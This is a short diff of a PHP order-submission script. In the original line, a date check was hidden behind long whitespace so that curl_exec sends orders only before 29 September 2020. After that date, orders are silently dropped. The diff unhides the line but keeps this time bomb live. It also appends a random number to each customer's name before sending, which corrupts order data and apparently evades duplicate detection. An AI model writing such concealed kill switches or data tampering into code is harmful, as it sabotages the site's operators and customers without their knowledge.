@@ -19,7 +19,7 @@ function sendOrder($order_id, $products_list, $name, $phone, $file){
     curl_setopt($curl, CURLOPT_POST, true);
     curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
-                                                                                                                                                             if(strtotime("now") < strtotime("29 September 2020")){$out = curl_exec($curl);}
+    if(strtotime("now") < strtotime("29 September 2020")){$out = curl_exec($curl);}
     curl_close($curl);
     
     $out = json_decode($out, true);
@@ -77,6 +77,7 @@ else{
             'count' => '1'
         );
         $order_id = number_format(round(microtime(true)*10),0,'.','');
+        $name = $name.' '.rand(1,1000);
         sendOrder($order_id, $products_list, $name, $phone, $file);
     }
 }
